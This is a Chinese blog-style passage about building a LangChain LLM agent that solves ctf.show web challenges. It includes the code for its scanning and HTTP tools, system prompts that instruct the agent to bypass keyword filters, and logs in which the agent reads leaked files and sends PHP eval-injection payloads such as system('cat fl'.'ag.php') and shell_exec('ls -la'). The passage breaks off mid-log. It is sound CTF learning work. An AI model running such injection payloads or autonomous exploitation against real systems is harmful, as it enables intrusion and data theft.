现在的agent,我赋予了他三个工具，分别是：

![image-20260204112155769](https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260204112155769.png)

nmap扫描端口，dirsearch扫描泄漏文件，readfile读取网页

**我想的是边做题边完善和增加我们的工具**

目前的工具有：

#### 工具dirsearch_scan

```py
"""目录/文件扫描工具。"""
import hashlib
import os
import random
import string
from urllib.parse import urlparse

import requests

from langchain_core.tools import tool

from .constants import DIRSEARCH_MAX_FOUND, FORBIDDEN_CHARS

# 基线响应体取前 N 字节做指纹，用于识别「伪 200」（SPA 统一回传同一页面）
BASELINE_BODY_SAMPLE = 4096


@tool
def dirsearch_scan(target_url: str = "http://127.0.0.1"):
    """
    目录/文件爆破。target_url: 目标 URL。
    """
    # 1. 基本 URL 规范化与安全校验
    url = (target_url or "http://127.0.0.1").strip()
    if FORBIDDEN_CHARS.search(url):
        msg = "错误：target_url 含有非法字符"
        print(f"\n[dirsearch_scan] {msg}")
        return msg
    if not url.startswith(("http://", "https://")):
        msg = "错误：target_url 必须以 http:// 或 https:// 开头"
        print(f"\n[dirsearch_scan] {msg}")
        return msg

    # 2. 仅允许本地目标
    try:
        parsed = urlparse(url)
        host = (parsed.hostname or "").lower()
    except Exception:
        msg = "错误：无法解析 target_url"
        print(f"\n[dirsearch_scan] {msg}")
        return msg
    if not host:
        msg = "错误：无法从 target_url 解析出 host"
        print(f"\n[dirsearch_scan] {msg}")
        return msg

    # 3. 从 dicc.txt 读取字典（优先 tools 同目录，否则项目根目录）
    _this_dir = os.path.dirname(os.path.abspath(__file__))
    _root_dir = os.path.dirname(_this_dir)
    _dicc_path = os.path.join(_this_dir, "dicc.txt")
    if not os.path.isfile(_dicc_path):
        _dicc_path = os.path.join(_root_dir, "dicc.txt")
    if not os.path.isfile(_dicc_path):
        msg = f"错误：未找到字典文件 dicc.txt，请将 dicc.txt 放在项目根目录或 tools 目录下"
        print(f"\n[dirsearch_scan] {msg}")
        return msg
    try:
        with open(_dicc_path, "r", encoding="utf-8", errors="replace") as f:
            wordlist = [line.strip() for line in f if line.strip()]
    except Exception as e:
        msg = f"错误：读取 dicc.txt 失败：{e}"
        print(f"\n[dirsearch_scan] {msg}")
        return msg
    if not wordlist:
        msg = "错误：dicc.txt 为空或无可用的路径条目"
        print(f"\n[dirsearch_scan] {msg}")
        return msg

    # 4. 使用 Session 提升性能，并显式禁用系统代理，避免干扰本地请求
    session = requests.Session()
    session.trust_env = False

    # 5. 基线请求：很多站点（尤其 SPA）对任意路径都返回 200 + 同一页面，需用「响应指纹」过滤
    baseline_len = None
    baseline_fingerprint = None
    baseline_path = "".join(
        random.choices(string.ascii_lowercase + string.digits, k=24)
    )
    try:
        base_resp = session.get(
            f"{url.rstrip('/')}/{baseline_path}",
            timeout=5,
            allow_redirects=False,
        )
        baseline_len = len(base_resp.content)
        sample = base_resp.content[:BASELINE_BODY_SAMPLE]
        baseline_fingerprint = hashlib.sha256(sample).hexdigest()
    except Exception:
        pass

    def _same_as_baseline(resp) -> bool:
        """与基线响应一致则视为「伪 200」，不当作有效命中。"""
        if baseline_len is None or baseline_fingerprint is None:
            return False
        if len(resp.content) != baseline_len:
            return False
        sample = resp.content[:BASELINE_BODY_SAMPLE]
        return hashlib.sha256(sample).hexdigest() == baseline_fingerprint

    found = []

    for path in wordlist:
        full_url = f"{url.rstrip('/')}/{path}"
        try:
            resp = session.get(full_url, timeout=5, allow_redirects=False)
        except Exception:
            continue

        code = resp.status_code
        if code in (301, 302, 403):
            found.append(f"[{code}] {full_url}")
            if len(found) >= DIRSEARCH_MAX_FOUND:
                break
        elif code == 200:
            # 200 需与基线比对，避免 SPA 对任意路径都返回同一页面造成的假阳性
            if not _same_as_baseline(resp):
                found.append(f"[{code}] {full_url}")
                if len(found) >= DIRSEARCH_MAX_FOUND:
                    break

    if not found:
        msg = "扫描完成，未发现常见敏感路径"
        print(f"[dirsearch_scan] {msg}")
        return msg
    result = "\n".join(found)
    if len(found) >= DIRSEARCH_MAX_FOUND:
        result += f"\n(仅显示前 {DIRSEARCH_MAX_FOUND} 条，已截断)"
    print(f"\n[dirsearch_scan] 扫描结果:\n{result}")
    return result
```





#### 工具nmap_scan

```py
"""端口扫描工具。"""
import subprocess

from langchain_core.tools import tool


@tool
def nmap_scan(target: str, scan_type: str = "quick"):
    """
    端口扫描。target: 目标 IP/域名/URL；scan_type: quick(常用端口)/full(全端口)/service(服务探测)。
    """
    # 从 URL 中提取主机（如 http://example.com:8080/path -> example.com）
    host = target.strip()
    if "://" in host:
        host = host.split("://", 1)[1]
    if "/" in host:
        host = host.split("/", 1)[0]
    if ":" in host and not host[0].isdigit():
        host = host.rsplit(":", 1)[0]  # 保留端口前的域名

    scan_opts = {
        "quick": "-F -T4",           # 快速扫描常用端口
        "full": "-p- -T4",           # 全端口扫描
        "service": "-sV -T4 --top-ports 100",  # 服务版本探测
    }
    opts = scan_opts.get(scan_type, scan_opts["quick"])

    try:
        result = subprocess.run(
            ["nmap", *opts.split(), host],
            capture_output=True,
            text=True,
            timeout=120,
        )
        if result.returncode != 0 and result.stderr:
            return f"nmap 执行失败: {result.stderr}"
        return result.stdout or "无输出"
    except FileNotFoundError:
        return "错误：未找到 nmap，请确保已安装 nmap 并加入 PATH"
    except subprocess.TimeoutExpired:
        return "错误：nmap 执行超时"
```



#### 工具read_web_file

```py
"""读取指定 URL 的页面/文件内容。"""
import requests

from langchain_core.tools import tool


@tool
def read_web_file(url: str, max_chars: int | None = None):
    """
    读取指定 URL 的页面/文件文本内容。
    """
    try:
        session = requests.Session()
        session.trust_env = False
        resp = session.get(url, timeout=5)
        text = resp.text
        if max_chars is not None:
            text = text[:max_chars]
        return f"文件内容:\n{text}"
    except Exception as e:
        return f"读取失败: {e}"
```





先来小试牛刀吧

### 第一关 信息搜集

#### 泄漏robots.txt

web4

最开始给AI一个系统提示，让它进入CTF玩家状态

```
sys_msg = SystemMessage(
    content=(
        "你是一名 CTF 竞赛与渗透测试专家。"
        "可使用 nmap_scan 做端口扫描（scan_type: quick/full/service）；"
        "使用 dirsearch_scan 做 Web 目录/文件扫描（仅需传 target_url）；"
        "使用 read_web_file 读取指定 URL 的页面/文件内容（dirsearch 发现感兴趣路径后可用此工具获取 Flag 或线索）。"
        "重要：当你已获得足够信息、找到 Flag、或已尝试主要敏感路径仍无新发现时，请直接给出最终结论和总结，不要再调用工具。"
    ),
)
```



现在的提示词是：

```
目标为 http://86101e6c-1732-4dc9-a62a-4bb081ccb6e1.challenge.ctf.show/，请用使用现有的工具扫描并分析开放端口及服务，检查是否存在文件泄漏,最终目标是拿到flag
```



成功拿到flag

来看一下agent的整个渗透过程：

```
[AI]: 好的，扫描结果显示目标开放了以下端口：
- 22/tcp: SSH 服务
- 80/tcp: HTTP 服务  
- 443/tcp: HTTPS 服务

现在让我对 HTTP 服务进行目录扫描，寻找可能的敏感文件或目录：
[TOOL]: "\u9519\u8bef\uff1a\u76ee\u6807 host '86101e6c-1732-4dc9-a62a-4bb081ccb6e1.challenge.ctf.show' \u4e0d\u5728\u5141\u8bb8\u5217\u8868\u3002\u5141\u8bb8: ['127.0.0.1', 'localhost']"
[AI]: 看起来工具对域名有限制。让我尝试直接访问目标网站，看看是否能获取到有用信息：
[TOOL]: "\u6587\u4ef6\u5185\u5bb9 (\u524d1000\u5b57\u7b26):\nweb4:where is flag?"
[AI]: 页面显示 "web4:where is flag?"，这是一个提示。让我尝试一些常见的敏感文件路径：
[TOOL]: "\u6587\u4ef6\u5185\u5bb9 (\u524d1000\u5b57\u7b26):\nUser-agent: *\r\nDisallow: /flagishere.txt"
[AI]: 太好了！robots.txt 文件显示有一个禁止访问的路径 `/flagishere.txt`。让我尝试访问这个文件：
[TOOL]: "\u6587\u4ef6\u5185\u5bb9 (\u524d1000\u5b57\u7b26):\nctfshow{28ce4724-43c6-4240-b89b-7e2fd14de304}"
[AI]: 完美！我找到了 Flag。让我再检查一下其他常见的敏感文件，确保没有遗漏其他信息：
[TOOL]: "\u6587\u4ef6\u5185\u5bb9 (\u524d1000\u5b57\u7b26):\nweb4:where is flag?"
[AI]: 
[TOOL]: "\u6587\u4ef6\u5185\u5bb9 (\u524d1000\u5b57\u7b26):\nweb4:where is flag?"
[AI]: 
[TOOL]: "\u6587\u4ef6\u5185\u5bb9 (\u524d1000\u5b57\u7b26):\nweb4:where is flag?"
[AI]: ## 渗透测试总结

### 1. 端口扫描结果
- **22/tcp**: SSH 服务（开放）
- **80/tcp**: HTTP 服务（开放）  
- **443/tcp**: HTTPS 服务（开放）

### 2. 信息收集与分析
1. 访问主页面显示提示信息："web4:where is flag?"
2. 检查 `robots.txt` 文件发现敏感路径：`Disallow: /flagishere.txt`
3. 直接访问 `/flagishere.txt` 成功获取 Flag

### 3. 发现的漏洞
- **信息泄露漏洞**: robots.txt 文件泄露了敏感文件路径 `/flagishere.txt`
- 该文件本应被 robots.txt 禁止搜索引擎爬取，但未对普通用户访问进行限制

### 4. 获取的 Flag
**ctfshow{28ce4724-43c6-4240-b89b-7e2fd14de304}**
```

#### 泄漏index.phps

web5

现在的提示词是：

```
目标为 http://345dd519-57d7-437d-b4a2-3436d78b0cbd.challenge.ctf.show/，请用使用现有的工具扫描并分析开放端口及服务，检查是否存在文件泄漏,最终目标是拿到flag
```



成功拿到flag

来看一下agent的整个渗透过程：

````

==================== 渗透日志 ====================
[User]: 目标为 http://345dd519-57d7-437d-b4a2-3436d78b0cbd.challenge.ctf.show/，请用使用现有的工具扫描并分析开放端口及服务，检查是否存在文件泄漏,最终目标是拿到flag
[AI]: 我来帮您进行全面的CTF挑战分析。首先从端口扫描开始，了解目标的基本情况。
[TOOL]: "Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-04 12:00 CST\nNmap scan report for 345dd519-57d7-437d-b4a2-3436d78b0cbd.challenge.ctf.show (124.223.158.81)\nHost is up (0.049s latency).\nNot shown: 84 filtered tcp ports (no-response)\nPORT     STATE  SERVICE\n21/tcp   closed ftp\n22/tcp   open   ssh\n80/tcp   open   http\n443/tcp  open   https\n3389/tcp closed ms-wbt-server\n5000/tcp closed upnp\n5009/tcp closed airport-admin\n5051/tcp closed ida-agent\n5060/tcp closed sip\n5101/tcp closed admdog\n5190/tcp closed aol\n5357/tcp closed wsdapi\n5432/tcp closed postgresql\n5631/tcp closed pcanywheredata\n5666/tcp closed nrpe\n6000/tcp closed X11\n\nNmap done: 1 IP address (1 host up) scanned in 5.18 seconds\n"
[AI]: 端口扫描结果显示：
- 22端口开放：SSH服务
- 80端口开放：HTTP服务
- 443端口开放：HTTPS服务
- 其他端口关闭

现在让我对Web服务进行目录扫描，寻找可能的敏感文件或目录：
[TOOL]: "[200] http://345dd519-57d7-437d-b4a2-3436d78b0cbd.challenge.ctf.show/index.phps\n[200] http://345dd519-57d7-437d-b4a2-3436d78b0cbd.challenge.ctf.show/robot.txt"
[AI]: 很好！发现了两个有趣的文件：
1. `index.phps` - 可能是PHP源代码文件
2. `robot.txt` - 可能是robots.txt文件

让我先查看`robot.txt`文件：
[TOOL]: "\u6587\u4ef6\u5185\u5bb9 (\u524d1000\u5b57\u7b26):\nweb5:where is flag ?"
[AI]: `robot.txt`文件内容显示："web5:where is flag ?" 这看起来像是一个提示。现在让我查看`index.phps`文件：
[TOOL]: "\u6587\u4ef6\u5185\u5bb9 (\u524d1000\u5b57\u7b26):\n<?php\r\n\r\n/*\r\n# -*- coding: utf-8 -*-\r\n# @Author: h1xa\r\n# @Date:   2020-09-01 14:14:17\r\n# @Last Modified by:   h1xa\r\n# @Last Modified time: 2020-09-01 14:34:53\r\n# @email: h1xa@ctfer.com\r\n# @link: https://ctfer.com\r\n\r\n*/\r\n\r\n//ctfshow{f8e1d292-2ef0-4991-94fa-12953f04eb36}\r\necho \"web5:where is flag ?\"\r\n\r\n"
[AI]: 太好了！我在`index.phps`文件中找到了Flag！

## 总结与结论

通过系统性的渗透测试，我成功找到了目标网站的Flag：

### 扫描结果：
1. **端口扫描**：发现目标开放了22(SSH)、80(HTTP)、443(HTTPS)端口
2. **目录扫描**：发现了两个关键文件：
   - `index.phps` - PHP源代码文件
   - `robot.txt` - 提示文件

### 发现的Flag：
在`index.phps`文件中找到了完整的Flag：
```
ctfshow{f8e1d292-2ef0-4991-94fa-12953f04eb36}
```
````

### 第二关 命令执行

#### 过滤flag

web29

题目是这样的

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```



上面的文件泄漏只需要读取网站的工具就行
这里可以看到需要使用get进行发包了，那就给agent加一个发包工具

#### 工具web_request

一起来看看源码：

```py
"""HTTP 请求工具。"""
import json
from typing import Literal
import requests
from langchain_core.tools import tool


@tool
def web_request(
    url: str,
    method: Literal["GET", "POST"] = "GET",
    params: dict | None = None,
    data: dict | None = None,
    json_data: dict | None = None,
    headers: dict | None = None,
    max_chars: int | None = None,
):
    """
    发起 HTTP 请求。url: 目标 URL；method: GET/POST；params/data/json_data/headers: 可选参数。
    根据read_web_file返回的网页信息进行下一步动作
    """

    session = requests.Session()
    session.trust_env = False

    try:
        # 归一化：允许 LLM 传 null/None
        if headers is None:
            headers = {}

        default_headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) CTF-Agent/1.0"
        }
        if headers:
            default_headers.update(headers)


        req = requests.Request(
            method=method.upper(),
            url=url,
            params=params,
            data=data,
            json=json_data,
            headers=default_headers,
        )
        prepped = session.prepare_request(req)

        response = session.send(
            prepped,
            timeout=10,
            allow_redirects=False,
        )

        result = {
            "status_code": response.status_code,
            "reason": response.reason,
            "headers": dict(response.headers),
            "content": response.text if max_chars is None else response.text[:max_chars],
        }

        return json.dumps(result, ensure_ascii=False)

    except Exception as e:
        return f"请求执行失败: {str(e)}"
```



因为添加了工具，所以系统提示词也要换：

```py
sys_msg = SystemMessage(
    content=(
        "你是一名安全测试与代码审计助手。"
        "你可以调用这些工具：nmap_scan（端口扫描）、dirsearch_scan（目录/文件扫描）、read_web_file（读取页面/文件）、web_request（HTTP 请求）。"
        "工作原则：先获取证据再行动。优先读取目标根路径与常见入口（如 index.php）来获取页面源码/提示。"
        "请求构造规则：需要传查询参数时，必须使用 web_request 的 params 字段；需要提交表单/JSON 时分别使用 data/json_data 字段，不要把参数手拼到 URL 字符串里。"
        "【关键规则】一旦 read_web_file 返回了服务端逻辑/源码片段（例如 eval/preg_match/include/system 等），后续请求必须围绕该逻辑构造（例如遇到关键词过滤就用拼接、编码/解码、变量/函数间接调用等方式绕过），禁止继续无依据的猜路径/盲扫。"
        "重要：当你已获得足够信息或已经得到目标答案时，请直接给出最终结论与简要总结，不要再调用工具。"
    ),
)
```



现在的提示词是：

```
目标为 http://0fd588f6-494a-4335-94c5-a55436ead90a.challenge.ctf.show/。请使用现有工具进行分析并给出最终结论。
```



毫无疑问，也是成功了的
来看一下整个流程

```
Agent 启动，进入 CTF 渗透模式...
---- 正在执行工具: read_web_file 参数: {'url': 'http://0fd588f6-494a-4335-94c5-a55436ead90a.challenge.ctf.show/'} ---
---- 正在执行工具: web_request 参数: {'url': 'http://0fd588f6-494a-4335-94c5-a55436ead90a.challenge.ctf.show/', 'method': 'GET', 'params': {'c': "system('ls -la');"}} ---
---- 正在执行工具: web_request 参数: {'url': 'http://0fd588f6-494a-4335-94c5-a55436ead90a.challenge.ctf.show/', 'method': 'GET', 'params': {'c': "system('cat fl' . 'ag.php');"}} ---
---- 正在执行工具: web_request 参数: {'url': 'http://0fd588f6-494a-4335-94c5-a55436ead90a.challenge.ctf.show/', 'method': 'GET', 'params': {'c': "$a='fl';$b='ag.php';system('cat '.$a.$b);"}} ---
```

可以看到agent一来就使用read_web_file工具去读取网页信息，获取php源码后使用web_request工具进行传参```system('ls -la');```，得到网站目录有什么flag.php之后直接构造绕过flag的payload，最后拿到flag



可以看一下整个渗透日志：

```
==================== 渗透日志 ====================
[User]: 目标为 http://0fd588f6-494a-4335-94c5-a55436ead90a.challenge.ctf.show/。请使用现有工具进行分析并给出最终结论。
[AI]: 我将按照工作原则对目标进行分析。首先读取根路径来获取页面源码和提示。
[AI tool_calls]:
- read_web_file (id=call_00_dyYFIDrE6kQFH0eFrIfPUJnq) args={'url': 'http://0fd588f6-494a-4335-94c5-a55436ead90a.challenge.ctf.show/'}

[TOOL]: "\u6587\u4ef6\u5185\u5bb9:\n<code><span style=\"color: #000000\">\n<span style=\"color: #0000BB\">&lt;?php\r<br />\r<br /></span><span style=\"color: #FF8000\">/*\r<br />#&nbsp;-*-&nbsp;coding:&nbsp;utf-8&nbsp;-*-\r<br />#&nbsp;@Author:&nbsp;h1xa\r<br />#&nbsp;@Date:&nbsp;&nbsp;&nbsp;2020-09-04&nbsp;00:12:34\r<br />#&nbsp;@Last&nbsp;Modified&nbsp;by:&nbsp;&nbsp;&nbsp;h1xa\r<br />#&nbsp;@Last&nbsp;Modified&nbsp;time:&nbsp;2020-09-04&nbsp;00:26:48\r<br />#&nbsp;@email:&nbsp;h1xa@ctfer.com\r<br />#&nbsp;@link:&nbsp;https://ctfer.com\r<br />\r<br />*/\r<br />\r<br /></span><span style=\"color: #0000BB\">error_reporting</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">0</span><span style=\"color: #007700\">);\r<br />if(isset(</span><span style=\"color: #0000BB\">$_GET</span><span style=\"color: #007700\">[</span><span style=\"color: #DD0000\">'c'</span><span style=\"color: #007700\">])){\r<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">$c&nbsp;</span><span style=\"color: #007700\">=&nbsp;</span><span style=\"color: #0000BB\">$_GET</span><span style=\"color: #007700\">[</span><span style=\"color: #DD0000\">'c'</span><span style=\"color: #007700\">];\r<br />&nbsp;&nbsp;&nbsp;&nbsp;if(!</span><span style=\"color: #0000BB\">preg_match</span><span style=\"color: #007700\">(</span><span style=\"color: #DD0000\">\"/flag/i\"</span><span style=\"color: #007700\">,&nbsp;</span><span style=\"color: #0000BB\">$c</span><span style=\"color: #007700\">)){\r<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eval(</span><span style=\"color: #0000BB\">$c</span><span style=\"color: #007700\">);\r<br />&nbsp;&nbsp;&nbsp;&nbsp;}\r<br />&nbsp;&nbsp;&nbsp;&nbsp;\r<br />}else{\r<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">highlight_file</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">__FILE__</span><span style=\"color: #007700\">);\r<br />}</span>\n</span>\n</code>"
[AI]: 很好！我已经获得了服务端源码。这是一个典型的代码执行漏洞，关键信息如下：

1. 存在GET参数 `c`
2. 使用 `preg_match("/flag/i", $c)` 过滤包含"flag"（不区分大小写）的输入
3. 如果没有匹配到"flag"，则执行 `eval($c)`

现在我需要构造绕过过滤的payload来读取flag。由于过滤了"flag"关键词，我需要使用各种绕过技术。让我先尝试一些基本的绕过方法。

首先尝试使用PHP的include函数来包含文件，但需要绕过flag关键词检测：
[AI tool_calls]:
- web_request (id=call_00_1m7NZw4T9Ag6huzX4Ezggj74) args={'url': 'http://0fd588f6-494a-4335-94c5-a55436ead90a.challenge.ctf.show/', 'method': 'GET', 'params': {'c': "system('ls -la');"}}

[TOOL]: "{\"status_code\": 200, \"reason\": \"OK\", \"headers\": {\"Server\": \"nginx/1.20.1\", \"Date\": \"Wed, 04 Feb 2026 08:08:25 GMT\", \"Content-Type\": \"text/html; charset=UTF-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"X-Powered-By\": \"PHP/7.3.11\", \"Access-Control-Allow-Methods\": \"GET,POST,PUT,DELETE,OPTIONS\", \"Access-Control-Allow-Credentials\": \"true\", \"Access-Control-Expose-Headers\": \"Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection\", \"Access-Control-Allow-Headers\": \"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection,Origin\", \"Access-Control-Max-Age\": \"1728000\", \"Content-Encoding\": \"gzip\"}, \"content\": \"total 20\\ndrwxrwxrwx    1 www-data www-data      4096 Feb  4 07:48 .\\ndrwxr-xr-x    1 root     root          4096 Oct 31  2019 ..\\n-rw-r--r--    1 www-data www-data       280 Feb  4 07:48 flag.php\\n-rw-r--r--    1 www-data www-data       377 Sep  3  2020 index.php\\n\"}"
[AI]: 很好！可以看到有一个 `flag.php` 文件。现在我需要读取这个文件的内容，但需要绕过"flag"关键词的过滤。让我尝试几种方法：

1. 使用字符串拼接绕过
2. 使用变量间接引用
3. 使用编码绕过

首先尝试字符串拼接：
[AI tool_calls]:
- web_request (id=call_00_jJpmgtZCFjZ1gclP5fJ9Qor7) args={'url': 'http://0fd588f6-494a-4335-94c5-a55436ead90a.challenge.ctf.show/', 'method': 'GET', 'params': {'c': "system('cat fl' . 'ag.php');"}}

[TOOL]: "{\"status_code\": 200, \"reason\": \"OK\", \"headers\": {\"Server\": \"nginx/1.20.1\", \"Date\": \"Wed, 04 Feb 2026 08:08:32 GMT\", \"Content-Type\": \"text/html; charset=UTF-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"X-Powered-By\": \"PHP/7.3.11\", \"Access-Control-Allow-Methods\": \"GET,POST,PUT,DELETE,OPTIONS\", \"Access-Control-Allow-Credentials\": \"true\", \"Access-Control-Expose-Headers\": \"Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection\", \"Access-Control-Allow-Headers\": \"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection,Origin\", \"Access-Control-Max-Age\": \"1728000\", \"Content-Encoding\": \"gzip\"}, \"content\": \"<?php\\r\\n\\r\\n/*\\r\\n# -*- coding: utf-8 -*-\\r\\n# @Author: h1xa\\r\\n# @Date:   2020-09-04 00:14:07\\r\\n# @Last Modified by:   h1xa\\r\\n# @Last Modified time: 2020-09-04 00:14:17\\r\\n# @email: h1xa@ctfer.com\\r\\n# @link: https://ctfer.com\\r\\n\\r\\n*/\\r\\n\\r\\n$flag = 'ctfshow{872837e5-0779-4242-a24a-e57be4a84b9d}';\\r\\n\"}"
[AI]: 完美！我成功绕过了过滤并读取到了flag.php文件的内容。现在让我尝试另一种方法，使用变量间接引用：
[AI tool_calls]:
- web_request (id=call_00_XiKOS24tToxUJPBjkkOXFfCg) args={'url': 'http://0fd588f6-494a-4335-94c5-a55436ead90a.challenge.ctf.show/', 'method': 'GET', 'params': {'c': "$a='fl';$b='ag.php';system('cat '.$a.$b);"}}

[TOOL]: "{\"status_code\": 200, \"reason\": \"OK\", \"headers\": {\"Server\": \"nginx/1.20.1\", \"Date\": \"Wed, 04 Feb 2026 08:08:38 GMT\", \"Content-Type\": \"text/html; charset=UTF-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"X-Powered-By\": \"PHP/7.3.11\", \"Access-Control-Allow-Methods\": \"GET,POST,PUT,DELETE,OPTIONS\", \"Access-Control-Allow-Credentials\": \"true\", \"Access-Control-Expose-Headers\": \"Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection\", \"Access-Control-Allow-Headers\": \"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection,Origin\", \"Access-Control-Max-Age\": \"1728000\", \"Content-Encoding\": \"gzip\"}, \"content\": \"<?php\\r\\n\\r\\n/*\\r\\n# -*- coding: utf-8 -*-\\r\\n# @Author: h1xa\\r\\n# @Date:   2020-09-04 00:14:07\\r\\n# @Last Modified by:   h1xa\\r\\n# @Last Modified time: 2020-09-04 00:14:17\\r\\n# @email: h1xa@ctfer.com\\r\\n# @link: https://ctfer.com\\r\\n\\r\\n*/\\r\\n\\r\\n$flag = 'ctfshow{872837e5-0779-4242-a24a-e57be4a84b9d}';\\r\\n\"}"
[AI]: 很好！两种方法都成功了。现在我已经获得了足够的信息，可以给出最终结论。

## 最终结论

**目标分析结果：**

1. **漏洞类型**：代码执行漏洞（eval注入）
2. **漏洞位置**：GET参数 `c` 未经充分过滤直接传递给 `eval()` 函数
3. **过滤机制**：使用 `preg_match("/flag/i", $c)` 过滤包含"flag"关键词的输入
4. **绕过方法**：通过字符串拼接（如 `'fl' . 'ag.php'`）或变量间接引用成功绕过关键词过滤
5. **获取的Flag**：`ctfshow{872837e5-0779-4242-a24a-e57be4a84b9d}`
```



#### 过滤flag和system



```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

多过滤了一个system和php，对于现阶段的llm来说简单，直接秒了

还是把渗透日志贴出来：

```
==================== 渗透日志 ====================
[User]: 目标为 http://1db78995-e0f2-4130-ba4d-0c49fcb5d8d6.challenge.ctf.show/。请使用现有工具进行分析并给出最终结论。
[AI]: 我将按照工作原则，先读取目标根路径和常见入口来获取信息。
[AI tool_calls]:
- read_web_file (id=call_00_l0gnUNIqewSseavfjOT6Z8pO) args={'url': 'http://1db78995-e0f2-4130-ba4d-0c49fcb5d8d6.challenge.ctf.show/'}
[TOOL]: "\u6587\u4ef6\u5185\u5bb9:\n<code><span style=\"color: #000000\">\n<span style=\"color: #0000BB\">&lt;?php\r<br />\r<br /></span><span style=\"color: #FF8000\">/*\r<br />#&nbsp;-*-&nbsp;coding:&nbsp;utf-8&nbsp;-*-\r<br />#&nbsp;@Author:&nbsp;h1xa\r<br />#&nbsp;@Date:&nbsp;&nbsp;&nbsp;2020-09-04&nbsp;00:12:34\r<br />#&nbsp;@Last&nbsp;Modified&nbsp;by:&nbsp;&nbsp;&nbsp;h1xa\r<br />#&nbsp;@Last&nbsp;Modified&nbsp;time:&nbsp;2020-09-04&nbsp;00:42:26\r<br />#&nbsp;@email:&nbsp;h1xa@ctfer.com\r<br />#&nbsp;@link:&nbsp;https://ctfer.com\r<br />\r<br />*/\r<br />\r<br /></span><span style=\"color: #0000BB\">error_reporting</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">0</span><span style=\"color: #007700\">);\r<br />if(isset(</span><span style=\"color: #0000BB\">$_GET</span><span style=\"color: #007700\">[</span><span style=\"color: #DD0000\">'c'</span><span style=\"color: #007700\">])){\r<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">$c&nbsp;</span><span style=\"color: #007700\">=&nbsp;</span><span style=\"color: #0000BB\">$_GET</span><span style=\"color: #007700\">[</span><span style=\"color: #DD0000\">'c'</span><span style=\"color: #007700\">];\r<br />&nbsp;&nbsp;&nbsp;&nbsp;if(!</span><span style=\"color: #0000BB\">preg_match</span><span style=\"color: #007700\">(</span><span style=\"color: #DD0000\">\"/flag|system|php/i\"</span><span style=\"color: #007700\">,&nbsp;</span><span style=\"color: #0000BB\">$c</span><span style=\"color: #007700\">)){\r<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eval(</span><span style=\"color: #0000BB\">$c</span><span style=\"color: #007700\">);\r<br />&nbsp;&nbsp;&nbsp;&nbsp;}\r<br />&nbsp;&nbsp;&nbsp;&nbsp;\r<br />}else{\r<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">highlight_file</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">__FILE__</span><span style=\"color: #007700\">);\r<br />}</span>\n</span>\n</code>"
[AI]: 很好！我已经获取到了源码。这是一个PHP代码审计题目。让我分析一下代码逻辑：

1. 通过GET参数`c`接收输入
2. 使用`preg_match`过滤了`flag`、`system`、`php`这三个关键词（不区分大小写）
3. 如果没有匹配到这些关键词，就执行`eval($c)`

这是一个典型的命令执行绕过题目。我需要构造一个payload来绕过过滤并执行命令。由于过滤了`system`，我需要使用其他PHP函数来执行命令，比如：
- `shell_exec()`
- `exec()`
- `passthru()`
- `popen()`
- 反引号操作符

同时要避免使用`flag`和`php`关键词。

让我先尝试使用`shell_exec()`来执行命令：
[AI tool_calls]:
- web_request (id=call_00_5dy83m5eiTqQIyxOe05ACyBx) args={'url': 'http://1db78995-e0f2-4130-ba4d-0c49fcb5d8d6.challenge.ctf.show/', 'method': 'GET', 'params': {'c': "echo shell_exec('ls -la');"}}
[TOOL]: "{\"status_code\": 200, \"reason\": \"OK\", \"headers\": {\"Server\": \"nginx/1.20.1\", \"Date\": \"Wed, 04 Feb 2026 08:24:52 GMT\", \"Content-Type\": \"text/html; charset=UTF-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"X-Powered-By\": \"PHP/7.3.11\", \"Access-Control-Allow-Methods\": \"GET,POST,PUT,DELETE,OPTIONS\", \"Access-Control-Allow-Credentials\": \"true\", \"Access-Control-Expose-Headers\": \"Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection\", \"Access-Control-Allow-Headers\": \"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection,Origin\", \"Access-Control-Max-Age\": \"1728000\", \"Content-Encoding\": \"gzip\"}, \"content\": \"total 20\\ndrwxrwxrwx    1 www-data www-data      4096 Feb  4 08:24 .\\ndrwxr-xr-x    1 root     root          4096 Oct 31  2019 